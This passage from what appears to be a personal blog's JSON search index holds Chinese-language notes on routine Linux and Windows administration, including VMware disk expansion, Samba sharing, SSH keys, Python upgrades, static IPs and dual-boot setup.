$linux_gfx_mode\n                insmod gzio\n                if [ x$grub_platform = xxen ]; then insmod xzio; insmod lzopio; fi\n                insmod part_gpt\n                insmod ext2\n                set root='hd0,gpt2'\n                if [ x$feature_platform_search_hint = xy ]; then\n                  search --no-floppy --fs-uuid --set=root --hint-bios=hd0,gpt2 --hint-efi=hd0,gpt2 --hint-baremetal=ahci0,gpt2  a0e37184-9d79-4234-beca-b50ef9e04936\n                else\n                  search --no-floppy --fs-uuid --set=root a0e37184-9d79-4234-beca-b50ef9e04936\n                fi\n                echo    'Loading Linux 5.4.0-26-generic ...'\n                linux   /boot/vmlinuz-5.4.0-26-generic root=UUID=a0e37184-9d79-4234-beca-b50ef9e04936 ro  maybe-ubiquity nokaslr\n                echo    'Loading initial ramdisk ...'\n                initrd  /boot/initrd.img-5.4.0-26-generic\n        }\n```\n\n\n\n参考文章：\n\n[linux配置开启KASAN功能](https://www.cnblogs.com/sanshigoodgoodstudy/p/16927422.html)\n\n[Linux内核编译](https://blog.csdn.net/ibless/article/details/82349507)\n\n[Ubuntu 20.04 如何禁用自动更新，删除更新提示和缓存](https://sysin.org/blog/disable-ubuntu-auto-update/)\n\n\n\n# ubuntu vmware磁盘扩容\n\n扩容有两种方案，一种是添加新分区并挂载到系统的某个目录下，另一种是直接扩充原来的分区。\n\n## 挂载到某个目录\n\n1. 关闭虚拟机，编辑虚拟机设置。在虚拟机设置界面，硬件选项卡下的硬盘(SCSI)中，有“扩展磁盘容量”一行，设置成目标磁盘大小。\n\n2. 打开虚拟机，添加新分区后重启系统\n\n   ```bash\n   sudo fdisk /dev/sda\n   m\t\t# 查看帮助命令\n   p\t\t# 打印分区表\n   n\t\t# 添加新分区\n   # 然后一路回车，直到出现\"Created a new partition\"的提示，表明创建成功\n   w\t\t# 保存设置并退出\n   reboot\t# 重启系统\n   ```\n\n3. 重启后，挂载磁盘\n\n   ```bash\n   sudo fdisk -l\t\t# 先看一下上一步中添加分区成功了没有，成功了再继续往下操作，没成功就重复第二步\n   df -T\t\t\t\t# 查看原来的文件系统类型，我的是ext4\n   sudo mkfs -t ext4 /dev/sda3\t\t# 格式化分区，我的是/dev/sda3\n   mkdir /home/bling/test\t\t\t# 创建一个目录，待挂载\n   sudo mount /dev/sda3 /home/bling/test\t\t# 将/dev/sda3挂载到/home/bling/test目录\n   ```\n\n4. 设置开机自动挂载\n\n   ```bash\n   sudo vim /etc/fstab  \n   # 在文件最后一行添加如下内容\n   /dev/sda3 /home/bling/test ext4 defaults 0 1\n   ```\n\n## 扩充原有磁盘\n\n1. 关闭虚拟机，编辑虚拟机设置。在虚拟机设置界面，硬件选项卡下的硬盘(SCSI)中，有“扩展磁盘容量”一行，设置成目标磁盘大小。\n\n2. 打开虚拟机，添加新分区后重启系统\n\n   ```bash\n   sudo fdisk /dev/sda\n   m\t\t# 查看帮助命令\n   p\t\t# 打印分区表\n   d\t\t# 删除原来的一个分区\n   n\t\t# 添加新分区，会合并所有未分区的磁盘（这个操作跟windows磁盘操作类似，先删除再合并）\n   # 然后一路回车，直到出现\"Created a new partition\"的提示，表明创建成功\n   w\t\t# 保存设置并退出\n   sudo resize2fs /dev/sda2\t\t# 更新分区，我的是/dev/sda2\n   df -h \t\t\t# 此时就能看到/dev/sda2扩容了\n   ```\n\n   \n\n参考文章：\n\n[Vmware虚拟机Ubuntu下，命令完成磁盘的扩容](https://blog.csdn.net/weixin_42432281/article/details/90953267)\n\n[ubuntu 18 VMWare 如何 命令行 扩展磁盘](https://blog.csdn.net/wowocpp/article/details/126490093)\n\n\n\n# 解决ubuntu中\"Could not get lock /var/lib/dpkg/lock\"\n\n[How to Fix ‘E: Could not get lock /var/lib/dpkg/lock’ Error in Ubuntu Linux](https://itsfoss.com/could-not-get-lock-error/)\n\n[How To Fix \"Could not get lock /var/lib/dpkg/lock - open (11 Resource temporarily unavailable)\" Errors](https://www.linuxuprising.com/2018/07/how-to-fix-could-not-get-lock.html)\n\n比较暴力的方法是，直接rm -rf 那两个lock文件\n\n\n\n# Kali 2020版中文显示乱码的解决方案\n\n安装完2020最新kali中文版后，发现界面出现了无数“麻将块”。原因是该版本对中文的不支持，因此需要我们自己安装一下中文字体。\n\n## 更改kali的镜像源\n\n在sources.list中添加一个源：\n\n```shell\nvim /etc/apt/sources.list\n\n# tsinghua university\ndeb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\ndeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\n\n```\n\n添加完源之后，必须立马执行更新命令：\n\n```shell\nsudo apt-get update\n```\n\n## 安装中文字体\n\n依次执行以下命令：\n\n```shell\n# 安装本地设置\nsudo apt-get install locales\nlocale -a\n# 安装中文字体\nsudo apt-get install xfonts-intl-chinese\nsudo apt-get install ttf-wqy-microhei\n#重启kali\nsudo reboot\n```\n\n参考了如下几篇文章的方法：\n\n[2019kali中文乱码](https://www.cnblogs.com/ainv-123/p/12158303.html)\n\n[解决安装kali 2020.1版本后的中文乱码问题](https://blog.csdn.net/weixin_45604567/article/details/104156673)\n\n[什么是locale？](https://wiki.ubuntu.org.cn/Locale)\n\n\n\n# ubuntu 1804 安装搜狗输入法\n\n在官网下载linux版搜狗输入法的deb安装包，下载到本地后，执行以下三条命令\n\n```shell\nsudo dpkg -i sogoupinyin_2.3.1.0112_amd64.deb\nsudo apt --fix-broken install\nsudo dpkg -i sogoupinyin_2.3.1.0112_amd64.deb\n```\n\n在settings -> Region& Language -> Manage Installed Languages中把Keyboard input method system从IBus修改为fcitx。然后点击Apply System Wide。最后重启电脑。\n\n重启完成后，在系统中搜索fcitx configuration，点击左下角的加号，取消勾选Only Show Current Language，然后选择Sougou Pinyin，OK一下就可以了。\n\n现在就可以通过ctrl+shift切换输入法！\n\n\n\n# Linux上安装samba服务\n\n## ubuntu环境\n\n（1）安装smb服务\n\n```shell\nsudo apt update\nsudo apt install samba\nwhereis samba\n```\n\n（2）指定共享文件夹\n\n```shell\nsudo vim /etc/samba/smb.conf\n\t[sambashare]\n    \t\tcomment = Samba on Ubuntu\n    \t\tpath = /any/folder/\n    \t\tread only = no\n    \t\tbrowsable = yes\nsudo service smbd restart\nsudo ufw allow samba （ps：如果没有防火墙或者防火墙未开启，这一步可省略）\n```\n\n（注意： /any/folder/需要将folder权限设置为777，这样才能正常访问）\n\n（3）指定访问用户\n\n```shell\nsudo smbpasswd -a username\n```\n\nusername是ubuntu上的一个普通用户。\n\n（4）windows上访问\n\n```shell\n//ubuntu-ip/sambashare\n```\n\nwindows访问如上地址就可以进入到/any/folder/目录了！\n\n## redhat环境\n\n参考：\n\n[ubuntu上设置samba服务](https://ubuntu.com/tutorials/install-and-configure-samba#1-overview)\n\n[redhat上设置samba服务](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/selinux_users_and_administrators_guide/sect-managing_confined_services-samba-configuration_examples)\n\n\n\n# Linux上添加/删除用户\n\nubuntu添加新用户：\n\n```shell\nadduser bling\n```\n\n将用户添加到root组\n\n```shell\nsudo chmod u+w /etc/sudoers\nsudo vim /etc/sudoers\n\t在root下方添加：bling ALL(ALL:ALL) ALL\nsudo chmod u-w /etc/sudoers\n```\n\n删除用户：\n\n```shell\ndeluser bling\n```\n\n\n\n# Linux上安装java jdk\n\n这里以openjdk为例，如果需要安装oracle Java JDK，请用参考链接中的方式。\n\n```shell\n# 更新软件包列表\nsudo apt-get update\n# 安装openjdk-8-jdk\nsudo apt-get install openjdk-8-jdk\n# 查看java版本，验证是否安装成功\njava -version\n```\n\n参考：\n\n[Ubuntu 18.04安装Java JDK8三种方式](https://blog.csdn.net/zbj18314469395/article/details/86064849)\n\n# Linux上升级python\n\n## ppa源升级\n\n- 添加ppa源，安装python 3.6\n\n```shell\nsudo add-apt-repository ppa:jonathonf/python-3.6\nsudo apt-get update\nsudo apt-get install python3.6\n```\n\n- 调整python3的优先级的方法见5.2\n\n## 源码升级\n\n- 去官网下载所需版本的python源码包。\n\n[python源码网址](https://www.python.org/ftp/python/)\n\n- 安装依赖\n\n```shell\nsudo apt-get install gcc make zlib1g-dev\nsudo apt-get install libbz2-dev\nsudo apt-get install libsqlite3-dev\nsudo apt-get install python3-dev libxml2-dev libffi-dev libssl-dev libxslt1-dev\n```\n\n- 开始安装\n\n```shell\ntar -zxvf Python-3.6.7.tgz\nsudo mv Python-3.6.7 /usr/local\ncd /usr/local/Python-3.6.7\n./configure\nsudo make\nsudo make install\n```\n\n- 更改python版本优先级\n\n查询python安装路径：`whereis python`\n\n调整优先级，将新安装的3.6调到最大：\n\n```shell\nsudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 100\nsudo update-alternatives --install /usr/bin/python python /usr/local/bin/python3.6 200\nsudo update-alternatives --install /usr/bin/python python /usr/bin/python3.5 150\n```\n\n到这一步就算是结束了，此时使用`python --version`可以看到python已经是3.6版本的了。\n\n- 后续设置变更\n\n```shell\n# 查询可配置的python\nupdate-alternatives --list python\n# 切换默认python版本\nupdate-alternatives --config python\n```\n\n参考：\n\n[Ubuntu 16.04 升级Python版本到3.6](https://www.jianshu.com/p/738f08dfe1f8)\n\n[Ubuntu 16.04 源码安装Python-3.6.7](https://www.jianshu.com/p/43e0e25bc0d0)\n\n[linux中安装Thrift（指定版本）](https://blog.csdn.net/xc_zhou/article/details/82593854)\n\n\n\n# Linux下生成/应用patch\n\n## 普通patch\n\n1. 为单个文件生成patch\n\n   `diff -up /oldFilePath /newFilePath > file.patch`\n\n   参数说明:\n\n   -u 显示有差异行的前后几行(上下文), 默认是前后各3行, 这样, patch中带有更多的信息.\n\n   -p 显示代码所在的c函数的信息.\n\n2. 为多个文件生成patch `diff -uprN /oldFolderPath /newFolderPath > folder.patch`\n\n   参数说明:\n\n   -r 递归地对比一个目录和它的所有子目录(即整个目录树).\n\n   -N 如果某个文件缺少了, 就当作是空文件来对比. 如果不使用本选项, 当diff发现旧代码或者新代码缺少文件时, 只简单的提示缺少文件. 如果使用本选项, 会将新添加的文件全新打印出来作为新增的部分.\n\n3. linux打补丁\n\n   `patch -p1 < demo.patch`\n\n   生成的补丁中, 路径信息包含了你的Linux源码根目录的名称, 但其他人的源码根目录可能是其它名字, 所以, 打补丁时, 要进入你的Linux源码根目录, 并且告诉patch工具, 请忽略补丁中的路径的第一级目录(参数-p1).\n\n   diff命令必须在整个Linux源码的根目录的上一级目录中执行.\n\n4. solaris打补丁\n\n   `gpatch -p1 < demo.patch`\n\n例如：\n\n```\npatch -p1 < huawei_patch/huawei_tf_gic_0001.patch\npatch -p1 < huawei_patch/huawei_tf_gic_0002.patch\n```\n\n## git patch\n\nhttps://juejin.im/post/5b5851976fb9a04f844ad0f4\n\n# ssh\n\n安装命令：\n\n```shell\n# 客户端\nsudo apt-get install ssh  或者 sudo apt-get install openssh-client\n# 服务端\nsudo apt-get install openssh-server\n```\n\nssh服务命令：\n\n```shell\nsudo/etc/init.d/ssh start\nsudo/etc/init.d/ssh restart\nsudo/etc/init.d/ssh stop\n```\n\n配置文件：\n\n```shell\n# 更改ssh配置文件前最好先备份一个\nsudo cp/etc/ssh/sshd_config /etc/ssh/sshd_config.original\n# 可以在如下配置文件中修改Port端口号（默认是22），PermitRootLogin等\nvim /etc/ssh/sshd_config\n```\n\n生成ssh key免密登录：\n\n```shell\n# 在客户端生成用于登录的公私钥，生成后位于~/.ssh/目录下\nssh-keygen -t rsa -b 4096 -C \"xxx@mail.com\"\n# 将公钥拷贝到远端服务器的~/.ssh/目录下，并重命名为authorized_keys\nscp ~/.ssh/id_rsa.pub user@ip:~/.ssh/authorized_keys\n```\n\n参考：\n\n[Generating a new SSH key and adding it to the ssh-agent](https://help.github.com/en/github/authenticating-to-github/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent)\n\n\n\n\n# ubuntu设置静态ip\n\n1、更改interfaces文件中的内容\n\n```shell\nsudo vim /etc/network/interfaces\n\nauto enp0s8\niface enp0s8 inet static\naddress 192.168.56.116\nnetmask 255.255.255.0\ngateway 192.168.56.1\n```\n\n2、刷新ip\n\n```shell\nsudo ip addr flush enp0s8\nsudo systemctl restart networking.service\n```\n\n3、设置重启后依然生效\n\n```shell\nsudo vim /etc/NetworkManager/NetworkManager.conf\n# 将NetworkManager.conf中managed=false改为managed=true\nsudo service network-manager restart\n```\n\n参考文章如下：\n\n[ubuntu 16.04 设置静态IP](https://www.jianshu.com/p/d69a95aa1ed7)\n\n\n\n\n\n","tags":["linux"],"categories":["Others"]},{"title":"windows releated","url":"/2019/01/01/windows-releated/","content":"\n# 虚拟机相关\n\n## vmware\n\n### 安装vmware-tools\n\n- 点击菜单栏中“虚拟机” --> “安装vmware tools”\n- 此时虚拟机中会有一个CD driver\n- 点击CD driver，将其中的VMware tar包拷贝到本地目录\n- 解tar包\n- 进解开的tar包目录，用sudo执行vmware-xxx.pl文件安装即可\n\n### 安装open-vm-tools\n\n```shell\nsudo apt update\n# sudo apt install open-vm-tools\nsudo apt install open-vm-tools-desktop\n\n# 安装完后，一定记得重启虚拟机！！！\n```\n\n\n共享文件夹：\n\n- 在线方式\n\n```\n//虚拟机开机的情况下，在“虚拟机”-->“设置”-->“选项”中设置好共享文件夹\n//便可以在/mnt/hgfs/xxx共享目录访问了\n//如果这样不可访问的话，就参照离线方式的命令执行一遍\n```\n\n- 离线方式\n\n```shell\n//先将虚拟机关机，在“虚拟机”-->“设置”-->“选项”中设置好共享文件夹\n//使用如下命令可以查看共享目录设置是否成功\nvmware-hgfsclient\n//再进入虚拟机中\nmkdir /mnt/hgfs\ncd /mnt\nsudo chmod 777 ./hgfs\nsudo chown bling:bling hgfs -R\nvmhgfs-fuse .host:/ /mnt/hgfs\n```\n\n### 防火墙设置\n\n添加一条防火墙规则，如此vmware虚拟机内才能ping通/访问host网络。\n\n[windows防火墙 新加虚拟机vmnetwork8](https://blog.51cto.com/hutiewei/3054468)\n\n```\n以主机为例，依次打开防火墙，高级设置，入站规则，新建规则，自定义，任何协议任何端口。\n到了选择ip的时候，本地ip选择任何本地ip，远程ip添加上虚拟机的局域网ip。\n下一步，选允许连接。\n搞定。\n```\n\n### 磁盘扩容\n\n[vmware中linux使用gparted调整磁盘大小并设置swap分区](https://blog.csdn.net/weixin_39309257/article/details/106474067)\n\n参考上文，主要步骤如下：\n\n1. 将虚拟机关机，在虚拟机设置中选择扩展磁盘，设置合适的大小\n2. 设置完毕后，启动虚拟机，安装gparted\n3. 在gparted中，删除夹在根目录分区和新分区之间的extended分区（先/dev/sda5，后/dev/sda2）\n4. 扩展根目录分区，并预留extended分区大小的磁盘\n5. 在最后未分配的磁盘中，先new出一个extended的分区，然后再在这个extended的分区里new一个逻辑分区，并且file system选择为linux-swap\n6. 点击根目录分区，选择绿色的钩钩，完成保存\n\n\n### 调试vmware虚拟机\n\n某些情况下，我们需要调试vmware中安装的虚拟机操作系统，可以按如下步骤设置。\n\n1. 将虚拟机关机\n2. 打开虚拟机所在文件夹下的 `xxx.vmx` 文件，将如下两行内容添上\n    ```\n        debugStub.listen.guest64 = \"TRUE\"\n        debugStub.listen.guest64.remote = \"TRUE\"\n    ```\n3. 重启虚拟机\n4. 在windows上可以看到一个新的监听端口：8864\n5. 在另一台虚拟机中，利用gdb可以通过该端口调试目标系统\n\n## virtual box\n\nvirtual box增强功能\n\n安装增强功能：[VirtualBox虚拟机 Ubuntu 16.04.3 LTS 安装增强功能]( https://blog.csdn.net/caoleiwe/article/details/78583676)\n\n设置共享文件夹： [分享Virtualbox Ubuntu 共享文件夹、自动挂载的一些问题](https://blog.csdn.net/skylake_/article/details/53132499)\n\n\n\n\n\n# windows安装samba实现文件夹共享\n\n## windows侧的设置\n\n[Windows 10 Samba文件共享的设置方法，解决不能访问和密码错误的问题](https://www.51cto.com/article/658846.html)\n\n详细的操作见以上链接，总结如下几个点：\n\n1. 在控制面板的“启用或关闭windows功能”中，选中smb相关的复选框\n2. 在计算机管理的“本地用户和组”中，新增一个用户，如名称叫“share”，设置密码，选中“用户不能更改密码”和“密码永不过期”，最后点创建\n3. 双击新增的用户，在隶属于中，将其添加到组“User”中\n4. 创建需要共享的文件夹，共享给刚刚创建的用户“share”，允许其读写\n\n## ubuntu客户端侧的设置\n\n[在Linux系统上配置Samba客户端，访问Samba远程目录](https://www.linuxrumen.com/rmxx/2093.html)\n\n```bash\n# 安装smb客户端\nsudo apt install smbclient\n# 连接 smbclient //samba_hostname_or_server_ip/share_name -U username\nsmbclient //192.168.133.1/share2004 -U share\n# 将远程文件夹映射到本地\n# 安装cifs\nsudo apt install cifs-utils\n# 创建本地待挂载目录\nmkdir ~/win-share\n# 挂载  sudo mount -t cifs //samba_hostname_or_server_ip/sharename /mnt/smbmount -o username=username\nsudo mount -t cifs //192.168.133.1/share2004 /home/bling/win-share -o rw,uid=bling,username=share,password=xxx,vers=2.0\n# 卸载挂载的目录\nsudo umount /home/bling/win-share\n# 设置开机自挂载，需保证此时未处于挂载状态，配置文件/etc/fstab\n//192.168.133.1/share2004 /home/bling/win-share cifs rw,uid=bling,username=share,password=xxx,vers=2.0 0 0\n```\n\n遇到的错误及解决方案：\n\n[smbclient 报错：protocol negotiation failed: NT_STATUS_CONNECTION_RESET](https://blog.csdn.net/u013992330/article/details/107123229)\n\n[Linux：mount命令出现Host is down如何解决](https://www.cnblogs.com/linuxprobe-sarah/p/10807577.html)\n\n# win10 安装ubuntu1804双系统\n\n过程主要参考了以下两篇博客：\n\n[win10下装ubuntu双系统（免U盘）](https://www.jianshu.com/p/417c1001a559)\n\n[Windows + Linux 双系统的安装](https://blog.csdn.net/fanxueya1322/article/details/90205143)\n\n## 第一步：制作启动u盘\n\n我使用的ultraISO，网上很多教程。\n\n## 第二步：创建磁盘分区\n\n在windows中空出500G（我要经常用ubuntu系统，所以空出的多，实际上50G也可以）未分配的磁盘。\n\n桌面上电脑图标--》右键选择管理--》磁盘管理，然后划分一块未分配的磁盘（在要分配的磁盘上右键--》压缩卷）。\n\n## 第三步：禁用快速启动\n\n控制面板--》系统和安全--》电源选项--》选择电源按钮的功能--》更改当前不可用的设置。将该界面的“启用快速启动”选项前的勾去掉。保存修改。\n\n## 第四步：关闭安全启动\n\n重启进入bios设置\n\n## 第五步：安装过程\n\n重启进入bios，并选择从u盘启动。其中只有以下一点需要注意。\n\n有一步选择是否安装到windows旁边时：\n\n1、选择along side windows，继续下一步不需要手动划分磁盘，它就自动把我之前空出的500G给用了。（不知道为啥，误打误撞发现这样也可以安装上双系统）\n\n2、如果想自己划分磁盘的话，一定要记得选“其他”，然后设置分区。\n\n## 再次启动\n\n我用的方法比较笨，在开机的一瞬间，需要一直按ESC键（惠普电脑）进入开机选项，然后选择F9。进入F9后就可以选择是启动windows还是启动ubuntu啦。\n\n# windows运行WSL\n\n[windows 上运行linux](https://www.jianshu.com/p/e81fe9db1ebb)\n\n[不用装双系统，直接在 Windows 上体验 Linux：Windows Subsystem for Linux](https://sspai.com/post/43813)\n\n# clash透明网关\n\n[clash github下载地址](https://github.com/Fndroid/clash_for_windows_pkg)\n\n[clash for windows文档介绍](https://docs.cfw.lbyczf.com/)\n\n[clash基础配置教程](https://v2xtls.org/clash-for-windows%E9%85%8D%E7%BD%AEv2ray%E6%95%99%E7%A8%8B/)\n\n[clash透明路由](https://blog.serenader.me/shi-yong-pve-yun-xing-clash-pang-lu-you-xu-ni-ji-shi-xian-tou-ming-dai-li)\n\n# 文件管理器之QTTabBar\n\n少数派的[这篇文章](https://sspai.com/post/52521)介绍得很全面\n\n建议在[官方网站](http://qttabbar.wikidot.com/)中下载原版\n\n安装完成后，如果网络不行无法下载中文语言包，那么可以直接在[这个链接](https://github.com/yfdyh000/QTTabBar_zh-CN)下载语言包使用。\n\n# 命令行Cmder\n\n建议在[官方网站](https://cmder.net/)下载最新版，然后参考知乎[这篇文章](https://zhuanlan.zhihu.com/p/71706782)安装，它的配置过程很详细。\n","tags":["windows"],"categories":["Others"]}]